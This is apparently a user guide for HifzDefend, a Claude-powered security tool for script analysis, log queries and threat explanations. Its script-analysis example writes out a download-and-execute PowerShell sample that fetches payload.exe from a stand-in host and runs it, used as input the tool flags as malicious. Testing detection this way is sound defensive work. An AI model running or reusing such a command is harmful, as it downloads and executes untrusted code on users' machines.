# HifzDefend AI Features Guide

## 🤖 Powered by Claude AI

HifzDefend integrates Anthropic's Claude AI to provide intelligent malware analysis, natural language queries, and plain-language threat explanations.

---

## Table of Contents

1. [Overview](#overview)
2. [Script Analysis](#script-analysis)
3. [Natural Language Queries](#natural-language-queries)
4. [Threat Explanations](#threat-explanations)
5. [Cost Management](#cost-management)
6. [Advanced Configuration](#advanced-configuration)
7. [Best Practices](#best-practices)

---

## Overview

### What Can AI Do?

- **📜 Script Analysis**: Analyze PowerShell, Batch, Python scripts for malicious behavior
- **🔍 Natural Language Search**: Query security logs using plain English
- **💡 Threat Explanations**: Get human-readable explanations of threats
- **🧠 Context-Aware**: Understands security patterns and false positives
- **🚀 Fast**: Cached responses for repeated queries

### Requirements

```powershell
# Install AI dependencies
pip install anthropic chromadb sentence-transformers

# Set API key
$env:CLAUDE_API_KEY = "sk-ant-api03-YOUR-KEY-HERE"
```

---

## Script Analysis

### Basic Usage

```powershell
# Analyze any script file
hifzdefend analyze-script suspicious.ps1

# Specify script type
hifzdefend analyze-script unknown.txt --type powershell

# Save analysis report
hifzdefend analyze-script malware.bat --save
```

### What It Detects

#### ✅ Safe Patterns
- Normal system administration
- Legitimate automation scripts
- Known safe applications

#### ⚠️ Suspicious Patterns
- Obfuscated commands
- Unusual network activity
- Privilege escalation attempts
- Registry modifications

#### ❌ Malicious Patterns
- Code injection
- Download-execute chains
- Credential theft
- Ransomware behaviors
- C2 communication

### Example: Analyzing a PowerShell Script

```powershell
# Create a test script
@"
$url = 'http://malicious.com/payload.exe'
$output = '$env:TEMP\update.exe'
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
"@ > download.ps1

# Analyze it
hifzdefend analyze-script download.ps1
```

**Output:**
```
Claude Script Analyzer
Analyzing: download.ps1

Analysis Results:

Threat Level: MALICIOUS
Confidence: 98.5%

Summary:
This PowerShell script exhibits classic download-execute malware behavior. It downloads
an executable from an external URL and immediately runs it without user interaction.

Threat Indicators:
  • Invoke-WebRequest downloading executable
  • Automatic execution with Start-Process
  • Suspicious domain: malicious.com
  • Temporary directory usage
  • No signature verification

Recommendations:
  1. Do NOT execute this script
  2. Quarantine the file immediately
  3. Scan your system for similar threats
  4. Block the domain: malicious.com
  5. Review recent PowerShell execution logs

Technical Details:
  script_type: PowerShell
  commands_used: Invoke-WebRequest, Start-Process
  network_activity: HTTP download
  execution_rights: User-level
  obfuscation_level: None

API Cost: $0.0018 (245 in, 180 out)
```

### Supported Script Types

| Type | Extensions | Detection |
|------|-----------|-----------|
| PowerShell | `.ps1`, `.psm1` | ✅ Excellent |
| Batch | `.bat`, `.cmd` | ✅ Excellent |
| Python | `.py` | ✅ Excellent |
| JavaScript | `.js` | ✅ Good |
| VBScript | `.vbs`, `.vbe` | ✅ Good |
| Auto | Any | ✅ Auto-detects |

---

## Natural Language Queries

### Basic Queries

```powershell
# Ask about threats
hifzdefend query "what threats were detected today?"

# Search for specific patterns
hifzdefend query "show me all PowerShell alerts"

# Find suspicious activity
hifzdefend query "did any files get quarantined yesterday?"

# Understand patterns
hifzdefend query "what domains were blocked this week?"
```

### Interactive Mode

```powershell
# Start interactive session
hifzdefend query --interactive
```

**Example Session:**
```
HifzDefend Natural Language Query

Q: what threats were detected today?

A: Today I found 3 threats:
   1. Trojan.Win32.Generic in Downloads\installer.exe
   2. PUA.Win.Adware in AppData\Local\temp\setup.exe
   3. Suspicious PowerShell script in Desktop\update.ps1

Q: tell me more about the PowerShell script

A: The PowerShell script (Desktop\update.ps1) was flagged because it:
   - Downloads files from an untrusted domain
   - Attempts to disable Windows Defender
   - Uses Base64 encoding to hide commands
   This is classic malware behavior.

Q: what should I do?

A: Recommended actions:
   1. Do NOT run the script
   2. Delete Desktop\update.ps1
   3. Scan your system: hifzdefend scan C:\
   4. Check for other suspicious .ps1 files
   5. Review your recent downloads

Q: exit
```

### Query Examples

#### Security Overview
```powershell
hifzdefend query "summarize today's security events"
hifzdefend query "how many files were scanned this week?"
hifzdefend query "are there any active threats?"
```

#### Specific Investigations
```powershell
hifzdefend query "show me all detections from the Downloads folder"
hifzdefend query "what happened between 2pm and 5pm today?"
hifzdefend query "find all attempts to modify the registry"
```

#### Threat Intelligence
```powershell
hifzdefend query "what IPs have been blocked?"
hifzdefend query "are there any ransomware indicators?"
hifzdefend query "show me all cryptominer detections"
```

### How It Works

1. **Vector Search**: Your question is converted to a semantic embedding
2. **Context Retrieval**: Relevant log entries are found using ChromaDB
3. **AI Analysis**: Claude reads the logs and answers your question
4. **Caching**: Common queries are cached to save costs

---

## Threat Explanations

### Get Plain-Language Explanations

```powershell
# Explain a specific threat
hifzdefend explain "Trojan.Win32.Generic"

# Explain threat patterns
hifzdefend explain "ransomware"

# Understand attack types
hifzdefend explain "phishing"
```

### Example: Explaining a Trojan

```powershell
hifzdefend explain "Trojan.Win32.Generic"
```

**Output:**
```
Threat Explanation
Threat ID: Trojan.Win32.Generic

🦠 What is it?

A "Generic Trojan" is malware that disguises itself as legitimate software
but performs malicious actions without your knowledge.

🎯 What does it do?

Common trojan behaviors:
  • Steals passwords and personal data
  • Downloads additional malware
  • Creates backdoors for attackers
  • Logs your keystrokes
  • Takes screenshots
  • Uses your computer for botnet activities

⚠️ How did it get here?

Trojans typically arrive through:
  • Email attachments
  • Pirated software downloads
  • Fake software updates
  • Infected USB drives
  • Compromised websites

🛡️ What should you do?

Immediate actions:
  1. Disconnect from the internet
  2. Run a full system scan: hifzdefend scan C:\
  3. Change your passwords from another device
  4. Check for unauthorized account access
  5. Consider restoring from a clean backup

Prevention:
  • Keep Windows Defender enabled
  • Don't download pirated software
  • Verify email senders before opening attachments
  • Keep Windows and software updated
  • Use strong, unique passwords

📚 Technical Details:

Classification: Trojan Horse
Severity: High
Common variants: Emotet, TrickBot, QBot
First seen: 1990s (concept), 2000s (modern variants)
Persistence methods: Registry run keys, scheduled tasks, services

API Cost: $0.0008 (120 in, 95 out)
```

---

## Cost Management

### Understanding Costs

Claude API pricing (as of 2025):

| Model | Input | Output |
|-------|-------|--------|
| Claude Sonnet | $3/MTok | $15/MTok |
| Claude Haiku | $0.25/MTok | $1.25/MTok |

**HifzDefend defaults to Sonnet** for accuracy.

### Typical Costs

| Operation | Tokens (In/Out) | Cost |
|-----------|----------------|------|
| Script analysis (small) | 500 / 300 | $0.006 |
| Script analysis (large) | 2000 / 800 | $0.018 |
| Security query | 1000 / 400 | $0.009 |
| Threat explanation | 300 / 250 | $0.005 |

**Monthly estimate (moderate use):**
- 50 script analyses: ~$0.50
- 100 queries: ~$0.90
- 20 explanations: ~$0.10
- **Total: ~$1.50/month**

### Cost Controls

#### Built-in Limits

```powershell
# View current usage
hifzdefend ai-stats

# View cost breakdown
hifzdefend ai-cost

# Check API status
hifzdefend ai-test
```

#### Configuration

Edit `config/hifzdefend.toml`:

```toml
[ai.claude]
enabled = true
max_requests_per_hour = 100    # Rate limit
cache_responses = true          # Cache for 24h
cache_ttl = 86400              # Seconds
log_api_costs = true           # Track spending
```

#### Best Practices

1. **Use caching**: Default 24h cache saves 90% on repeated queries
2. **Batch operations**: Analyze multiple scripts together
3. **Set limits**: Configure `max_requests_per_hour`
4. **Monitor costs**: Check `ai-cost` regularly
5. **Disable when not needed**: Turn off AI in config

---

## Advanced Configuration

### config/hifzdefend.toml

```toml
[ai]
enabled = true  # Master AI toggle

[ai.claude]
enabled = true
model = "claude-sonnet-4-5"  # or "claude-opus-4-5" or "claude-haiku-4"
max_tokens = 4096
temperature = 0.0              # 0.0 = deterministic, 1.0 = creative
timeout = 30
cache_responses = true
cache_ttl = 86400
max_requests_per_hour = 100
log_api_costs = true
fallback_on_error = true
retry_attempts = 3
retry_delay = 1

# Feature flags
script_analysis = true
plain_language_explanations = true

[ai.natural_language]
enabled = true
vector_db_path = "data/vector_db"
embedding_model = "all-MiniLM-L6-v2"
max_context_results = 10

[ai.natural_language.chromadb]
collection_name = "hifzdefend_logs"
persist_directory = "data/vector_db"
```

### Environment Variables

```powershell
# Required
$env:CLAUDE_API_KEY = "sk-ant-api03-..."

# Optional overrides
$env:HIFZDEFEND_AI_MODEL = "claude-haiku-4"  # Use cheaper model
$env:HIFZDEFEND_AI_MAX_TOKENS = "2048"       # Reduce token usage
```

### Cache Management

```powershell
# View cache stats
hifzdefend ai-stats

# Clear cache (reset costs)
hifzdefend ai-reset-cache

# Cache location
# C:\Users\YourUser\AppData\Local\HifzDefend\cache\
```

---

## Best Practices

### 1. Cost Optimization

```powershell
# ✅ GOOD: Use caching
hifzdefend analyze-script file.ps1  # First time: $0.005
hifzdefend analyze-script file.ps1  # Cached: $0.000

# ✅ GOOD: Analyze selectively
hifzdefend analyze-script Downloads\*.ps1  # Only scripts

# ❌ BAD: Analyze everything
hifzdefend analyze-script C:\*.*  # Expensive!
```

### 2. Query Optimization

```powershell
# ✅ GOOD: Specific questions
hifzdefend query "what threats were found today?"

# ❌ BAD: Vague questions
hifzdefend query "what happened?"
```

### 3. Security

```powershell
# ✅ GOOD: Use environment variables
$env:CLAUDE_API_KEY = "sk-ant-..."

# ❌ BAD: Hardcode in config
# api_key = "sk-ant-..."  # Don't do this!
```

### 4. Monitoring

```powershell
# Check daily
hifzdefend ai-stats

# Weekly review
hifzdefend ai-cost

# Monthly budget check
# Aim for < $5/month for personal use
```

---

## Troubleshooting

### "API key not set"

```powershell
# Check if set
echo $env:CLAUDE_API_KEY

# Set it
$env:CLAUDE_API_KEY = "sk-ant-api03-YOUR-KEY"

# Make permanent
[Environment]::SetEnvironmentVariable("CLAUDE_API_KEY", "sk-ant-api03-...", "User")
```

### "AI features not available"

```powershell
# Install dependencies
pip install anthropic chromadb sentence-transformers

# Verify
python -c "import anthropic; import chromadb; print('AI ready!')"
```

### "ChromaDB errors"

```powershell
# Clear ChromaDB database
rm -r data/vector_db

# Reinitialize
hifzdefend query "test"
```

### "Rate limit exceeded"

```powershell
# Wait 1 hour, or increase limit in config:
# max_requests_per_hour = 200
```

### "API timeout"

```powershell
# Increase timeout in config:
# timeout = 60  # seconds
```

---

## Examples

### Example 1: Analyzing Downloaded Scripts

```powershell
# Analyze all PowerShell scripts in Downloads
Get-ChildItem Downloads\*.ps1 | ForEach-Object {
    hifzdefend analyze-script $_.FullName
}
```

### Example 2: Security Audit

```powershell
# Ask Claude to summarize security posture
hifzdefend query "summarize all threats from the past 7 days"
hifzdefend query "what are the top 3 security concerns?"
hifzdefend query "am I at risk of ransomware?"
```

### Example 3: Investigating an Alert

```powershell
# You got an alert for "Trojan.Win32.Agent"
hifzdefend explain "Trojan.Win32.Agent"
hifzdefend query "show me all detections of Trojan.Win32.Agent"
hifzdefend query "what files were affected?"
```

---

## What's Next?

- **[Troubleshooting Guide](TROUBLESHOOTING.md)** - Fix common issues
- **[Quick Start](QUICKSTART.md)** - Installation guide
- **[Full Documentation](../README.md)** - Complete features

---

**Questions?** [Open an issue](https://github.com/yourusername/hifzdefend/issues)

**Need help?** See the [Troubleshooting Guide](TROUBLESHOOTING.md)
